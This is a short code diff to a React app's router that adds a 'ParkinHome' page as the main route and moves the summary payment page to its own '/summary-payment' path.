@@ -10,6 +10,9 @@ import { ThemeProvider } from "./contexts/ThemeContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
 
 
+// Parkin Home Page
+import ParkinHome from "./pages/ParkinHome";
+
 // Form Pages
 import SummaryPayment from "./pages/SummaryPayment";
 
@@ -24,8 +27,10 @@ import FinalPage from "./pages/FinalPage";
 function Router() {
   return (
     <Switch>
-      {/* Main Page - Summary Payment */}
-      <Route path={"/"} component={SummaryPayment} />
+      {/* Main Page - Parkin Home */}
+      <Route path={"/"} component={ParkinHome} />
+
+      {/* Summary Payment */}
       <Route path={"/summary-payment"} component={SummaryPayment} />
 
       {/* Payment Routes */}
